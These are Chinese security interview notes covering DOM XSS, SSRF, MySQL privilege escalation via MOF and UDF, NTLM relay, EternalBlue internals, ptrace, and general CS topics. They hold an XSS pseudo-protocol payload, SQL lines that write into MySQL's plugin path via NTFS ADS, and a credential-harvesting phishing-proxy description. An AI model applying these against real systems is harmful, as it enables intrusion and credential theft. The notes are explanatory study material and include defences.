5、DOM型XSS,前端代码可以看到吗？

DOM树状，方便客户端的JavaScript脚本通过DOM动态的检查和修改页面内容，不依赖服务端的数据。客户端JavaScript可以访问浏览器的DOM文本对象模型是利用的前提，当确认客户端代码中有DOM型XSS漏洞时，并且能诱使(钓鱼)一名用户访问自己构造的URL

DOM型XSS主要是由客户端的脚本通过DOM动态地输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。其防御在于：（1） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现；（2） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码转义，如输出到HTML则进行HTML编码、输出到则进行JS编码。

可能触发DOM型XSS的属性：

document.referer属性

window.name属性

location属性：跳转。正常访问是用#去实现页面跳转，但是因为跳转部分参数可控，可能导致Dom xss。

通过 location.hash 的方式，将参数写在 # 号后，既能让JS读取到该参数，又不让该参数传入到服务器，从而避免了WAF的检测。 变量hash作为可控部分，并带入url中，变量hash控制的是#之后的部分，可以使用伪协议#javascript:alert(1)。常见的几种伪协议有javascript:、vbscript:、data:等。而现在的移动端（android和ios），都可以自定义这种协议从浏览器打开本地app，具体可以看看https://www.cnblogs.com/WuXiaolong/p/8735226.html#javascript:alert(1)

innerHTML属性：用于篡改页面，防护方法就是替换成innerText，它自动将HTML标签解析为普通文本，所以HTML标签不会被执行，避免XSS攻击。

documen.write属性

渲染后，不能。

6、SSRF

7、反序列化，Fastjson

XML-RPC

RMI默认配置

shiro框架

8、钓鱼，社工了解吗？

社会工程学是一种通过人际交流的方式获得信息的非技术渗透手段。不幸的是，这种手段非常有效，而且应用效率极高。事实上，社会工程学已是企业安全最大的威胁之一。

想要克隆的站点URL

Judas反向代理钓鱼工具

Jonathan Cooper使用Go反向代理进行网络钓鱼网站克隆。Judas工具是一个钓鱼代理，使用命令行即可克隆网站。代理需要接收来自受害者的请求，并在发送到目标网站之前重写它们。

Judas设置了一个简单的 TCP 侦听器，它产生一个新的 goroutine 来处理每个传入的连接和一个处理请求和响应的工作 goroutine。结果通过通道从请求处理 goroutine 传递给工作程序。

访问http://192.168.75.129:443即可访问克隆的网站，并开始监听收集凭证等信息。

9、渗透思路

10、redis提权方法

11、mysql可以做啥实现提权

SQL注入

udf提权，用户自定义函数，可以执行命令，新建管理员用户。

Mysql提权主要是需要利用高权限的Mysql用户进行操作，拿用户主要是下列几种方式

注入
上传getshell
查看网站数据库配置信息拿到用户密码
弱口令
mysql系统漏洞，比如CVE-2012-2122身份认证漏洞
mof提权

1.原理 在windows平台下，c:/windows/system32/wbem/mof/nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。

2.利用条件

mysql用户具有root权限(对上面那个目录可写） 关闭了secure-file-priv

udf提权

1.原理 UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限

2.利用条件

Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。 Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。 掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备`root账号所具备的权限的其它账号也可以。可以将udf.dll写入到相应目录的权限。

某些情况下，我们会遇到Can't open shared library的情况，这时就需要我们把udf.dll导出到lib\plugin目录下才可以，但是默认情况下plugin不存在，怎么办？ 还好有大牛研究出了利用NTFS ADS流来创建文件夹的方法

select @@basedir;

//查找到mysql的目录

select 'It is dll' into dumpfile 'C:\Program Files\MySQL\MySQL Server 5.1\lib::$INDEX_ALLOCATION';

//利用NTFS ADS创建lib目录

select 'It is dll' into dumpfile 'C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin::$INDEX_ALLOCATION';

//利用NTFS ADS创建plugin目录


执行成功以后再进行导出即可。

mysql反弹shell提权

其实这也属于udf提权，只不过应用场景不同，比如现在我们没有webshell但是我们却有偶然得到了mysql的root密码（弱口令等），恰巧目标机的数据库可以外联或者有phpmyadmin，那么我们就可以把上面udf.dll文件的内容先插入到数据表中，然后再导出到/lib/plugin目录。

windows启动项提权

当Windows的启动项可以被MySQL写入的时候可以使用MySQL将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。

这个在msf也有对应的模块可以使用，但是对中文路径支持不是特别好，而且还需要等待用户上线才能反弹shell，比较麻烦，所以这里就复现手工操作

这里的操作系统是中文的win2003，目录为C:/Documents and Settings/Administrator/「开始」菜单/程序/启动/

8.9 360成都 安全运营，西南出差

1、SQL注入讲一下我知道的

2、web和实习印象深刻的漏洞

黄金票据和文件上传。

8.6阿里巴巴蓝军北京
不能实习，业务安全，学习强国蓝军，可之后联系。

8.7腾讯朱雀实验室 应用运维安全
主要做渗透测试，检测防御团队防御是否到位。听一下录音。

之后聊了很多关于学校的事，2019年来学校招聘宣讲。

有潜力但是无实战经验。

1、黄金票据原理，版本？

2、NTLM中继

NTLM hash 分为 NTLMv1 NTLMv2 NTLM session v2 三种，NTLMv2 的强度比 NTLMv1 强了不少 ，我们在实战中，如果获得的是NTLMv1的话直接对其进行爆破就行了，而现实情况中我们遇到的是 NTLMv2，NTLMv2的密码强度高了不少，因此如果你没有一个超级强大的字典，你很难得到明文密码。那么，如果爆破行不通的话我们不妨试一下NTLM Relay攻击。

在这个NTLM Relay中，我们就是要将截获的Net-NTLM Hash重放来进行攻击，从而实现对其他机器的控制，所以严格意义上应该叫作Net-NTLM Relay。访问远程主机或服务，而不用提供明文密码

由于SMB、HTTP、LDAP、MSSQL等协议都可以携带NTLM认证的三类消息，所以只要是使用SMB、HTTP、LDAP、MSSQL等协议来进行NTLM认证的程序，都可以尝试向攻击者发送Net-NTLMhash从而让攻击者截获用户的Net-NTLMhash，也就是说我们可以通过这些协议来进行攻击。

NTLMrelayx将凭证中继到LDAP、IMAP和MSSQL，NTLMrelayx是著名的smbrelayx工具.。

交叉协议的中继攻击

NTLM 身份验证被封装在其他协议中，但是无论覆盖的协议是什么，消息都是相同的。这允许在其他协议中使用 NTLM 消息。例如，使用 HTTP 进行身份验证的客户端会在“ Authorization”标头中发送 NTLM 身份验证消息。攻击者可以从 HTTP 头中提取这些消息，并在其他协议中使用它们，比如 SMB。NTLM支持多种协议，例如SMB、HTTP(S)、LDAP、IMAP、SMTP、POP3和MSSQL。

（对于SMB协议，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录，所以攻击者可以模拟SMB服务器从而截获hash）

自动发现协议——代理自动检测(WPAD)

WPAD 网络代理自动发现协议是一种客户端使用DCHP、DNS、LLMNR、NBNS协议来定位一个代理配置文件(PAC)URL的方法。WPAD通过让浏览器自动发现代理服务器，查找存放PAC 文件的主机来定位代理配置文件，下载编译并运行，最终自动使用代理访问网络。

也许在过去的几年里，对于黑客们来说，最臭名昭著的功能恐怕是 Windows 代理自动检测(WPAD)功能。这个特性将通过DNS查找一个名为WPAD的主机名，如果不能通过上面描述的LLMNR和NBNS成功查找到，则连接到它能找到的第一个主机。滥用这一特性变得更加容易，因为当提示进行身份验证时，工作站会自动尝试使用 NTLM 身份验证进行身份验证，然后可以被攻击者执行中继攻击。

Windows系统名称解析顺序为：

本地hosts文件（%windir%\System32\drivers\etc\hosts）

DNS缓存/DNS服务器

链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）

也就是说，如果在缓存中没有找到名称，DNS名称服务器又请求失败时，Windows系统就会通过链路本地多播名称解析（LLMNR）和Net-BIOS名称服务（NBT-NS）在本地进行名称解析。这时，客户端就会将未经认证的UDP广播到网络中，询问它是否为本地系统的名称，由于该过程未被认证，并且广播到整个网络，从而允许网络上的任何机器响应并声称是目标机器。当用户输入不存在、包含错误或者DNS中没有的主机名时，通过工具(responder)监听LLMNR和NetBIOS广播，攻击者可以伪装成受害者要访问的目标机器，并从而让受害者交出相应的登陆凭证。核心过程与arp欺骗类似，我们可以让攻击者作中间人，截获到客户端的Net-NTLMHash。

中间人攻击

中间人攻击(man-in-middle attack，即攻击者接管受害者的流量)，这种攻击在企业网络中常常具有破坏性，尤其是在使用 ARP 欺骗等技术时。然而，当企业设备连接到不受信任的网络(例如公共 WiFi 网络)时，攻击者可以攻击受害者并截获不受 TLS 保护的流量，将其重定向到受害者工作站受信任的位置。然后，受害者将自动验证是否启用了自动内部网检测(这是默认的设置)。

防御

因此唯一完整的解决方案是完全禁用 NTLM 并切换到 Kerberos。

·启用 SMB 签名: SMB 签名将通过要求所有流量都进行签名来防止中继到 SMB。签名需要用户密码来验证消息，因此中继连接的攻击者不能发送任何将被服务器接受的流量，因为攻击者没有受害者的密码。

·启用 LDAP 签名: 与 SMB 签名类似，LDAP 签名可以防止中继到 LDAP 的无签名连接。应该注意的是，通过 TLS 连接到 LDAP 被认为是有签名的，因此此设置不能防止通过 TLS 对 LDAP 的中继攻击。

·启用扩展的身份验证保护: 扩展的身份验证保护有助于防止一些中继攻击，确保用于连接到服务器的 TLS 通道与客户端验证时使用的通道相同。此设置主要适用于 IIS。

·启用 SPN 目标名称验证: SPN 目标名称验证是另一个缓解措施，它通过验证客户端认为正在对其进行身份验证的目标名称来防止中继到SMB。如果名称与服务器不匹配，则拒绝身份验证。

·确保内部网站使用 HTTPS: 当内部网站通过不安全的 HTTP 协议访问时，用户无法验证连接的真实性。通过强制所有内部网站只能使用 HTTPS，中继服务的效率就会大大降低。

8.6知道创宇404实验室 安全研究
他们做漏洞复现，应急响应。

1、ptrace原理
ptrace系统调从名字上看是用于进程跟踪的，它提供了父进程可以观察和控制其子进程执行的能力，并允许父进程检查和替换子进程的内核镜像(包括寄存器)的值。其基本原理是: 当使用了ptrace跟踪后，所有发送给被跟踪的子进程的信号(除了SIGKILL)，都会被转发给父进程，而子进程则会被阻塞，这时子进程的状态就会被系统标注为TASK_TRACED。而父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行。

其原型为：   #include <sys/ptrace.h>  long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);  ptrace有四个参数:   1). enum __ptrace_request request：指示了ptrace要执行的命令。  2). pid_t pid: 指示ptrace要跟踪的进程。  3). void *addr: 指示要监控的内存地址。  4). void *data: 存放读取出的或者要写入的数据。
strace调试原理：

在上面的程序中，fork出的子进程先调用了ptrace(PTRACE_TRACEME)表示子进程让父进程跟踪自己。然后子进程调用execl加载执行了HelloWorld。而在父进程中则使用wait系统调用等待子进程的状态改变。子进程因为设置了PTRACE_TRACEME而在执行系统调用被系统停止(设置为TASK_TRACED)，这时父进程被唤醒，使用ptrace(PTRACE_PEEKUSER,pid,...)分别去读取子进程执行的系统调用ID(放在ORIG_EAX中)以及系统调用返回时的值(放在EAX中)。然后使用ptrace(PTRACE_SYSCALL,pid,...)指示子进程运行到下一次执行系统调用的时候(进入或者退出)，直到子进程退出为止。

GDB的实现 GDB是GNU发布的一个强大的程序调试工具，用以调试C/C++程序。可以使程序员在程序运行的时候观察程序在内存/寄存器中的使用情况。它的实现也是基于ptrace系统调用来完成的。其原理是利用ptrace系统调用，在被调试程序和gdb之间建立跟踪关系。然后所有发送给被调试程序的信号(除SIGKILL)都会被gdb截获，gdb根据截获的信号，查看被调试程序相应的内存地址，并控制被调试的程序继续运行。GDB常用的使用方法有断点设置和单步跟踪

3.1 建立调试关系 用gdb调试程序，可以直接gdb ./test,也可以gdb <pid>(test的进程号)。这对应着使用ptrace建立跟踪关系的两种方式: 1)fork: 利用fork+execve执行被测试的程序，子进程在执行execve之前调用ptrace(PTRACE_TRACEME)，建立了与父进程(debugger)的跟踪关系。如我们在分析strace时所示意的程序。 2)attach: debugger可以调用ptrace(PTRACE_ATTACH，pid,...)，建立自己与进程号为pid的进程间的跟踪关系。即利用PTRACE_ATTACH，使自己变成被调试程序的父进程(用ps可以看到)。用attach建立起来的跟踪关系，可以调用ptrace(PTRACE_DETACH，pid,...)来解除。注意attach进程时的权限问题，如一个非root权限的进程是不能attach到一个root进程上的。

3.2 断点原理 断点是大家在调试程序时常用的一个功能,如break linenumber，当执行到linenumber那一行的时候被调试程序会停止，等待debugger的进一步操作。 断点的实现原理，就是在指定的位置插入断点指令，当被调试的程序运行到断点的时候，产生SIGTRAP信号。该信号被gdb捕获并进行断点命中判定，当gdb判断出这次SIGTRAP是断点命中之后就会转入等待用户输入进行下一步处理，否则继续。断点的设置原理: 在程序中设置断点，就是先将该位置的原来的指令保存，然后向该位置写入int 3。当执行到int 3的时候，发生软中断，内核会给子进程发出SIGTRAP信号，当然这个信号会被转发给父进程。然后用保存的指令替换int3,等待恢复运行。断点命中判定:gdb把所有的断点位置都存放在一个链表中，命中判定即把被调试程序当前停止的位置和链表中的断点位置进行比较，看是断点产生的信号，还是无关信号。

3.3 单步跟踪原理 单步跟踪就是指在调试程序的时候，让程序运行一条指令/语句后就停下。GDB中常用的命令有next, step, nexti, stepi。单步跟踪又常分为语句单步(next, step)和指令单步(如nexti, stepi)。

最后让我们来回顾一下ptrace的使用:

1)用PTRACE_ATTACH或者PTRACE_TRACEME 建立进程间的跟踪关系。 2)PTRACE_PEEKTEXT, PTRACE_PEEKDATA, PTRACE_PEEKUSR等读取子进程内存/寄存器中保留的值。 3)PTRACE_POKETEXT, PTRACE_POKEDATA, PTRACE_POKEUSR等把值写入到被跟踪进程的内存/寄存器中。 4)用PTRACE_CONT，PTRACE_SYSCALL, PTRACE_SINGLESTEP控制被跟踪进程以何种方式继续运行。 5)PTRACE_DETACH, PTRACE_KILL 脱离进程间的跟踪关系。
8.5字节开发测试 8.13字节测试工程师
1、数组链表的区别

不同：链表是链式的存储结构；数组是顺序的存储结构。

链表通过指针来连接元素与元素，数组则是把所有元素按次序依次存储，数组是一块连续的区域。数组需要预留空间，在使用前要先申请占内存的大小，可能会浪费内存空间

链表的插入删除元素相对数组较为简单，不需要移动元素，且较为容易实现长度扩充，但是寻找某个元素较为困难；

数组寻找某个元素较为简单，但插入与删除比较复杂，由于最大长度需要再编程一开始时指定，故当达到最大长度时，扩充长度不如链表方便。

相同：两种结构均可实现数据的顺序存储，构造出来的模型呈线性结构。

数组的优点：随机访问性强，查找速度快

数组的缺点：插入和删除效率低，可能浪费内存，内存空间要求高，必须有足够的连续内存空间。数组大小固定，不能动态拓展

链表的优点：插入删除速度快，内存利用率高，不会浪费内存，大小没有固定，拓展很灵活。

链表的缺点：不能随机查找，必须从第一个开始遍历，查找效率低

2、指针引用的区别

两者的定义和性质不同

指针和引用都是地址的概念，指针指向一块内存，它的内容是所指内存的地址；引用是某块内存的别名。

指针是一个变量，存储的是一个地址，指向内存的一个存储单元；

引用是原变量的一个别名，跟原来的变量实质上是同一个东西。

int a = 996; int *p = &a; // p是指针, &在此是求地址运算 int &r = a; // r是引用, &在此起标识作用
上面定义了一个整型变量 a，p 是一个指针变量，p 的值是变量 a 的地址；

而引用 r，是 a 的一个别名，在内存中 r 和 a 占有同一个存储单元。

图片

指针可以有多级，引用只能是一级

int **p; // 合法 int &&a; // 不合法
指针可以在定义的时候不初始化，引用必须在定义的时候初始化

int *p; // 合法 int &r; // 不合法 int a = 996; int &r = a; // 合法
指针可以指向NULL，引用不可以为NULL

int *p = NULL; // 合法
int &r = NULL; // 不合法
指针:指针就是内存地址,指针变量是用来存放内存地址的变量.不同类型的指针变量所占用的存储单元长度是相同的，而存放数据的变量因数据的类型不同，所占用的存储空间长度也不同。

引用:引用不是新定义一个变量,而是给已存在变量取一个别名,编译器不会为引用变量开辟内存空间,它和它引用的变量共用同一块内存空间.

引用的主要用途是:修饰函数的形参和返回值.

在C++语言中,函数的参数和返回值的传递方式有三种:值传递,指针传递和引用传递.引用具有指针的效率,又具有变量使用的方便性和直观性.

实际上引用可以做的事,指针都可以做,为什么还要引用呢?

引用体现了最小特权原则,即给予程序元素完成其功能的最小权限. 指针能够毫无约束的操作内存中的任何东西,尽管功能强大,但是非常危险.

初始化:引用在定义时必须初始化,指针则没有要求(尽量初始化,防止野指针)
引用在初始化引用一个实体后,就不能再引用其它实体,而指针可以在任意时候指向一个同类型实体
没有NULL引用,但是有nullptr指针
在sizeof中含义不同: 引用结果为引用类型的大小,但指针始终是地址空间,所占字节个数(32位平台占4个字节)
引用自加即引用的实体增加1,指针自加即指针向后偏移一个类型的大小
有多级指针,但没有多级引用
访问实体的方式不同,指针需要显式解引用,引用编译器自己处理
引用比指针使用起来相对安全
2、Linux查询命令grep

常用选项：
　　-E ：开启扩展（Extend）的正则表达式。

　　-i ：忽略大小写（ignore case）。

　　-v ：反过来（invert），只打印没有匹配的，而匹配的反而不打印。

　　-n ：显示行号

　　-w ：被匹配的文本只能是单词，而不能是单词中的某一部分，如文本中有liker，而我搜寻的只是like，就可以使用-w选项来避免匹配liker

　　-c ：显示总共有多少行被匹配到了，而不是显示被匹配到的内容，注意如果同时使用-cv选项是显示有多少行没有被匹配到。

　　-o ：只显示被模式匹配到的字符串。

　　--color :将匹配到的内容以颜色高亮显示。

　　-A  n：显示匹配到的字符串所在的行及其后n行，after

　　-B  n：显示匹配到的字符串所在的行及其前n行，before

　　-C  n：显示匹配到的字符串所在的行及其前后各n行，context
输出十行，写入到文件

-o 重定向>

3、数据库索引

索引，用于提升数据库的查找速度。MySQL索引底层的实现，B+树

加速查找速度的数据结构，常见的有两类：

（1）哈希，例如HashMap，查询/插入/修改/删除的平均时间复杂度都是O(1)；

（2）树，例如平衡二叉搜索树，查询/插入/修改/删除的平均时间复杂度都是O(lg(n))；

可以看到，不管是读请求，还是写请求，哈希类型的索引，都要比树型的索引更快一些，那为什么，索引结构要设计成树型呢？

画外音：80%的同学，面试都答不出来。

索引设计成树形，和SQL的需求相关。

对于这样一个单行查询的SQL需求：

select * from t where name=”shenjian”;

确实是哈希索引更快，因为每次都只查询一条记录。

*画外音：所以，如果业务需求都是单行访问，例如passport，确实可以使用哈希索引。

但是对于排序查询的SQL需求：

（1）分组：group by

（2）排序：order by

（3）比较：<、>

（4）…

哈希型的索引，时间复杂度会退化为O(n)，而树型的“有序”特性，依然能够保持O(log(n)) 的高效率。

第一种：二叉搜索树

图片

二叉搜索树，如上图，是最为大家所熟知的一种数据结构，就不展开介绍了，它为什么不适合用作数据库索引？

（1）当数据量大的时候，树的高度会比较高，数据量大的时候，查询会比较慢；

（2）每个节点只存储一个记录，可能导致一次查询有很多次磁盘IO；

第二种：B树

图片

B树，如上图，它的特点是：

（1）不再是二叉搜索，而是m叉搜索；

（2）叶子节点，非叶子节点，都存储数据；

（3）中序遍历，可以获得所有节点；

B树为何适合做索引？

（1）由于是m分叉的，高度能够大大降低；

（2）每个节点可以存储j个记录，如果将节点大小设置为页大小，例如4K，能够充分的利用预读的特性，极大减少磁盘IO；

第三种：B+树

图片

B+树，如上图，仍是m叉搜索树，在B树的基础上，做了一些改进：

（1）非叶子节点不再存储数据，数据只存储在同一层的叶子节点上；

画外音：B+树中根到每一个节点的路径长度一样，而B树不是这样。

（2）叶子之间，增加了链表，获取所有节点，不再需要中序遍历；

这些改进让B+树比B树有更优的特性：

（1）范围查找，定位min与max之后，中间叶子节点，就是结果集，不用中序回溯；

画外音：范围查询在SQL中用得很多，这是B+树比B树最大的优势。

（2）叶子节点存储实际记录行，记录行相对比较紧密的存储，适合大数据量磁盘存储；非叶子节点存储记录的PK，用于查询加速，适合内存存储；

（3）非叶子节点，不存储实际记录，而只存储记录的KEY的话，那么在相同内存的情况下，B+树能够存储更多索引；

总结

（1）数据库索引用于加速查询；

（2）虽然哈希索引是O(1)，树索引是O(log(n))，但SQL有很多“有序”需求，故数据库使用树型索引；

（3）InnoDB不支持手动创建哈希索引；

（4）数据预读的思路是：磁盘读写并不是按需读取，而是按页预读，一次会读一页的数据，每次加载更多的数据，以便未来减少磁盘IO

（5）局部性原理：软件设计要尽量遵循“数据读取集中”与“使用到一个数据，大概率会使用其附近的数据”，这样磁盘预读能充分提高磁盘IO

（5）数据库的索引最常用B+树：

- 很适合磁盘存储，能够充分利用局部性原理，磁盘预读；

- 很低的树高度，能够存储大量数据；

- 索引本身占用的内存很小；

- 能够很好的支持单点查询，范围查询，有序性查询；

4、进程线程区别

每个进程都有自己的地址空间，即进程空间，在网络或多用户换机下，一个服务器通常需要接收大量不确定数量用户的并发请求，为每一个请求都创建一个进程显然行不通（系统开销大响应用户请求效率低），因此操作系统中线程概念被引进。

进程：

是并发执行的程序在执行过程中分配和管理资源的基本单位，是一个动态概念，竞争计算机系统资源的基本单位。

线程：

是进程的一个执行单元，是进程内科调度实体。比进程更小的独立运行的基本单位。线程也被称为轻量级进程。

协程：

是一种比线程更加轻量级的存在。一个线程也可以拥有多个协程。其执行过程更类似于子例程，或者说不带返回值的函数调用。

地址空间：

线程共享本进程的地址空间，而进程之间是独立的地址空间。

资源：

线程共享本进程的资源如内存、I/O、cpu等，不利于资源的管理和保护，而进程之间的资源是独立的，能很好的进行资源管理和保护。

健壮性：

多进程要比多线程健壮，一个进程崩溃后，在保护模式下不会对其他进程产生影响，但是一个线程崩溃整个进程都死掉。

执行过程：

每个独立的进程有一个程序运行的入口、顺序执行序列和程序入口，执行开销大。

但是线程不能独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制，执行开销小。

可并发性：

两者均可并发执行。

切换时：

进程切换时，消耗的资源大，效率高。所以涉及到频繁的切换时，使用线程要好于进程。同样如果要求同时进行并且又要共享某些变量的并发操作，只能用线程不能用进程。

其他：

线程是处理器调度的基本单位，但是进程不是。

协程避免了无意义的调度，由此可以提高性能，但程序员必须自己承担调度的责任。同时，协程也失去了标准线程使用多CPU的能力。切换由自己控制，由当前协程切换到其他协程由当前协程来控制。

*python多线程的问题（面试问题）

存在问题：

python由于历史遗留的问题，严格说多个线程并不会同时执行（没法有效利用多核处理器，python的并发只是在交替执行不同的代码）。

多线程在Python中只能交替执行，即使100个线程跑在100核CPU上，也只能用到1个核。所以python的多线程并发并不能充分利用多核，并发没有java的并发严格。

原因：

原因就在于GIL ，在Cpython 解释器（Python语言的主流解释器）中，有一把全局解释锁（GIL, Global Interpreter Lock），在解释器解释执行Python 代码时，任何Python线程执行前，都先要得到这把GIL锁。

这个GIL全局锁实际上把所有线程的执行代码都给上了锁。

这意味着，python在任何时候，只可能有一个线程在执行代码。

其它线程要想获得CPU执行代码指令，就必须先获得这把锁，如果锁被其它线程占用了，那么该线程就只能等待，直到占有该锁的线程释放锁才有执行代码指令的可能。

多个线程一起执行反而更加慢的原因：

同一时刻，只有一个线程在运行，其它线程只能等待，即使是多核CPU，也没办法让多个线程「并行」地同时执行代码，只能是交替执行，因为多线程涉及到上线文切换、锁机制处理（获取锁，释放锁等），所以，多线程执行不快反慢。

什么时候GIL 被释放？

当一个线程遇到I/O 任务时，将释放GIL。

计算密集型（CPU-bound）线程执行100次解释器的计步（ticks）时（计步可粗略看作Python 虚拟机的指令），也会释放GIL。

即，每执行100条字节码，解释器就自动释放GIL锁，让别的线程有机会执行。

Python虽然不能利用多线程实现多核任务，但可以通过多进程实现多核任务。多个Python进程有各自独立的GIL锁，互不影响。

5、http与https区别

TCP三次握手

访问浏览器发生了什么

浏览器解析URL

检查HSTS列表（Https） 浏览器检查自带的“预加载HSTS（HTTP严格传输安全）”列表，这个列表里包含了那些请求浏览器只使用HTTPS进行连接的网站。浏览器向网站发出第一个HTTP请求之后，网站会返回浏览器一个响应，请求浏览器只使用HTTPS发送请求。然而，就是这第一个HTTP请求，却可能会使用户收到 downgrade attack 的威胁，这也是为什么现代浏览器都预置了HSTS列表。

转换非ASCII的Unicode字符：浏览器检查输入是否含有不是 a-z， A-Z，0-9， - 或者 . 的字符

解析域名，找到主机IP。

浏览器与网站建立TCP连接

浏览器发起GET请求

显示页面或返回其他

浏览器处理及渲染

浏览器收到Response后，首先对其进行加载，并根据其中的代码继续向服务器请求资源(css、javascript、img等)，加载完成后对页面进行解析。 解析的过程，其实就是生成解析树，即Dom树。Dom树是由Dom元素及属性节点组成，加上css解析的样式对象和js解析后的动作实现。 接下来对Dom树进行可视化表示，也就是渲染，生成一颗渲染树。最后一步就是绘制网页，浏览器根据渲染树将元素绘制到屏幕上，同时执行js，完成整个页面的展示。

drop和delete区别

drop主要用于删除结构 例如删除数据库：drop database XX，删除表 drop table XX。字段也是结构的一种，也可以使用drop了？对的，但是我们改变了表结构要先alter方法。例如，我们要删除student表上的age字段的信息，可以这样写：alter table student drop age。

delete主要用于删除数据 举个例子，要删除 student表上名字为‘张三’的所有信息：delete from student where name=‘张三’。这种情况下用delete，由此可见delete常用于删除数据。

6、两个球，100层，用最少的次数摔碎

可以用不同层次。

7、编程题

数组，找到一个x，左边的比它小，右边的比它大。

最简单的思路是：遍历数组，对于每个元素分别往前、往后遍历一下，看看是否它是否满足条件。

通过分析可以得到，对于每个元素，如果它比左侧最大的值要大，同时比右侧最小的值要小，就满足条件。

数组，从小到大排序

最小公共字串

8.5 绿盟武汉二面 8.2一面
1、端口扫描

2、SSRF

3、自己分析过调试吗？代码审计

4、最印象深刻的

文件上传。github解决问题。

5、未来发展方向性的问题

6、印象深刻的具体的漏洞（web）

SSRF 和文件上传

7、同事矛盾沟通

选择倾听，主动思考。**不卑不亢，迎难而上。大是大非面前坚守底线。不做人身攻击。先保持冷静。及时停止争论**。

8.6兴业数金成都二面 7.29一面
主要问经历，安全运营，安全管理。

1、自我能力的判断

7.29科来 成都
安全研究中心（部门），技术支撑，自动化工具检测，产品研究，流量，渗透，开发，逆向，开发。

1、课程

C++ 操作系统 数据库。

2、内存木马检测

3、TCP握手

4、web工具

登录信息 爆破如何做

5、SQL注入

6、SSRF

7、内网横向移动

7.23shein希音 跨境电商 9.3 二面
蓝队，运营，规则部署工具，汇聚安全事件，waf，红队，应用安全，合规。

1、内存马的检测

查看命令执行

相关进程

二面

2、UNC的绕过方法

3、拟态和外面的防御的区别 优劣势

7.23京东 二面 7.21一面
漏洞研究，红队，免杀。安全工具的开发，自动一键利用。web和内网都有很多人，偏向于实践开发。

微信视频好像没记录。

1、内网如何用较少的流量探测主机

ping命令：通过ping检查网络连通性，通过telnet来测试指定端口连通性。

Powershell：通过powershell脚本扫描IP地址存活

基于MSF的内网主机探测：使用msf进行反弹shell进行内网渗透时，通过msf自带的扫描模块进行快速扫描。

Nmap扫描内网：Nmap是一个端口扫描器，可用于主机发现、端口扫描、版本检测、OS检测等。使用场景：建立socks代理，proxychains+Nmap扫描内网。

1）直接在webshell下执行，通过系统自带命令或上传脚本工具进行扫描探测 ；2）通过反弹shell进行内网渗透，msf等渗透测试框架自带一些扫描模块；3）通过socks代理扫描内网（例如 proxychains+Nmap扫描）。

在合适的场景下，选择最合适的武器。比如支持存活探测的协议，包括了 ARP、ICMP、SMB、 UDP、NETBIOS、SNMP协议等；支持端口扫描的方式，包括ACK扫描、SYN扫描、TCP扫描、UDP扫描、ICMP扫描等。



2、拟态项目简介

3、套接字通信

套接字（socket）为通信的端点，每个套接字由一个 IP 地址和一个端口号组成。通过网络通信的每对进程需要使用一对套接字，即每个进程各有一个。

创建 Socket，连接服务器，将 Socket 与远程主机连接。

服务端先初始化 Socket，建立流式套接字，与本机地址及端口进行绑定，然后通知 TCP，准备好接收连接，调用 accept() 阻塞，等待来自客户端的连接。

4、永恒之蓝原理

SMB 445端口。SMBv1版本。

是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。 SMB（全称是Server Message Block）是一个协议服务器信息块，它是一种客户机/服务器、请求/响应协议，通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP/IP协议之上，SMB使用TCP139端口和TCP445端口。永恒之蓝是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。通过永恒之蓝漏洞会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。

永恒之蓝依赖于一个名为srv!SrvOS2FeaListSizeToNt的windows函数。

第一个错误是当协议试图将OS / 2 FileExtended Attribute（FEA）列表结构转换为NT FEA结构以确定要分配多少内存时出现的数学错误。错误计算会产生整数溢出，导致分配的内存少于预期的数量，进而导致缓冲区溢出。如果写入的数据超出预期，则多余的数据可能溢出到相邻的存储空间中。

第二个错误是由于SMB协议对两个相关子命令：SMB_COM_TRANSACTION2和SMB_COM_NT_TRANSACT的定义不同而导致的缓冲区溢出。两者都有一个_SECONDARY命令，当单个分组中包含太多数据时使用该命令。TRANSACTION2和NT_TRANSACT之间的关键区别在于，后者需要一个数据包，大小是前者的两倍。如果客户端使用NT_TRANSACT紧接在前的子命令发送精心制作的消息，则会发生TRANSACTION2验证错误。虽然协议识别出两个分开的子命令已被接收到，其分配的类型和尺寸的数据包（并相应地分配内存）仅基于接收到的最后一个数据包的类型。由于最后一个较小，因此第一个数据包将占用比分配的更多的空间。

一旦攻击者实现了最初的溢出，他们就可以利用SMBv1中的第三个bug，该bug出现在SMB_COM_SESSION_SETUP_ANDX命令中：该命令的请求依赖于WordCount的值来确定具体的请求格式，当为12时和为13时红框中的变量会有所区别，利用该漏洞将12类型的请求包通过13类型进行处理，由于两种类型的请求包格式不一致，通过控制请求包指定偏移的数据，即可以控制SrvAllocateNonPagedPool创建的pool的大小，实现堆喷射，导致在指定地址分配内存，使得攻击者可以编写和执行Shellcode来控制系统。

防御

首先，确保更新并应用安全补丁MS17-10，其次禁用SMBv1，并且不使任何易受攻击的计算机访问互联网。

